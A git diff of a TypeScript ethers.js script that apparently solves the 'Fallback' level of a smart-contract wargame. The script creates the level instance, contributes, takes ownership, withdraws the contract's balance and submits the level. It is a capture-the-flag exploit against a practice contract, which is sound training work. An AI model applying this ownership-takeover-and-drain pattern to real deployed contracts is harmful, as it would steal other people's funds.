@@ -2,6 +2,7 @@ import { ethers, Signer } from "ethers";
 import { getSigner } from "./signer";
 
 import { Fallback__factory } from "../typechain/ethers-v5";
+import { createLevel, submitLevel } from "./utils";
 main()
   .then(() => {
     console.log("Done!");
@@ -14,8 +15,8 @@ main()
 
 async function main() {
 
-  const level = "0xD855A79471F18e8B6c5E565A61b7395999A32D24";
-  const signer = getSigner();  
+  const signer = getSigner();
+  const level =await createLevel(signer, "fallback");
   const fallout = Fallback__factory.connect(level, signer);
   console.log("owner:",await fallout.owner());
   console.log("contribute");
@@ -25,7 +26,8 @@ async function main() {
   console.log("owner:",await fallout.owner());
   console.log("withdraw all");
   console.log("balances before:",await signer.provider?.getBalance(level));
-  await fallout.withdraw();
+  await fallout.withdraw({gasLimit: 1000000});
   await fallout.deployTransaction.wait(1);
   console.log("balances after:",await signer.provider?.getBalance(level));
+  await submitLevel(signer, level);
 }
